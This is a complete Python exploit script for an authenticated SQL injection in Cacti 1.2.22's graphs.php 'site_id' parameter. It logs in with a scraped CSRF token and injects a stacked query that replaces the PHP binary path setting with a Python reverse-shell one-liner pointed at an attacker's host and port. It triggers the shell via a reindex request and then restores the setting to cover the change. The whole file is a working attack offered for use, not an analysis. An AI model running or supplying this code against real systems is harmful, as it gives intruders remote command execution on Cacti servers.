import argparse
import requests
import sys
import urllib3


sleep_time = 1
recover_payload = f"""1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))A) AND (IFNULL(h.disabled,"") = "") ) AS rs1 ) AS rs2 ON rs2.id=h1.id ORDER BY description LIMIT 30;update settings set value = "/usr/local/bin/php" where name = 'path_php_binary';#"""


def get_csrf_token():
    url = f"{target}/index.php"
    
    res_body = session.get(url).content.decode()
    csrf_token = res_body.split('var csrfMagicToken = "')[1].split('"')[0]
    if not csrf_token:
        print("[-] Unable to find csrf_token")
        sys.exit()
    return csrf_token

def login(username,password):
    login_url = f"{target}/index.php"

    csrf_token = get_csrf_token() 
    data = {'action':'login','login_username':username,'login_password':password,'__csrf_magic':csrf_token}
    
    res_body = session.post(login_url,data=data).content.decode()
    
    if 'You are now logged into <' in res_body:
        print('[+] Login successful!')
    else:
        print(res_body)
        print('[-] Login failed. Check your credentials')
        sys.exit()

def exploit():
    url = f"{target}/graphs.php"
    exploit_payload = f"""1 AND (SELECT 1 FROM (SELECT(SLEEP(1)))A) AND (IFNULL(h.disabled,"") = "") ) AS rs1 ) AS rs2 ON rs2.id=h1.id ORDER BY description LIMIT 30;update settings set value = "python3 -c \\"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\\" & /usr/local/bin/php" where name = 'path_php_binary';#"""

    params = {
        'action':'ajax_hosts',
        'site_id':exploit_payload
    }

    print('[+] Sending exploit payload...')
    print(f"[+] Payload: {exploit_payload}")
    session.get(url,params=params)

def reverse_shell():
    print('[+] Sending reverse shell payload...')
    url = f"{target}/host.php"
    params = {
        'action':'reindex'
    }
    session.get(url,params=params)

def recover():
    url = f"{target}/graphs.php"

    params = {
        'action':'ajax_hosts',
        'site_id':recover_payload
    }

    print('[+] Sending recover payload...')
    print(f"[+] Payload: {recover_payload}")
    session.get(url,params=params)
    
if __name__=='__main__':
    urllib3.disable_warnings()
    parser = argparse.ArgumentParser(description="Cacti 1.2.22 - graphs.php 'site_id' SQL Injection (authenticated)")
    parser.add_argument('-t','--target',help='',required=True)
    parser.add_argument('-u','--username',help='',required=True)
    parser.add_argument('-p','--password',help='',required=True)
    parser.add_argument('-L','--lhost',help='',required=True)
    parser.add_argument('-P','--lport',help='',required=True)
    args = parser.parse_args()
    
    username = args.username
    password = args.password
    target = args.target
    lhost = args.lhost
    lport = args.lport
    session = requests.Session()

    login(username,password)
    exploit()
    reverse_shell()
    recover()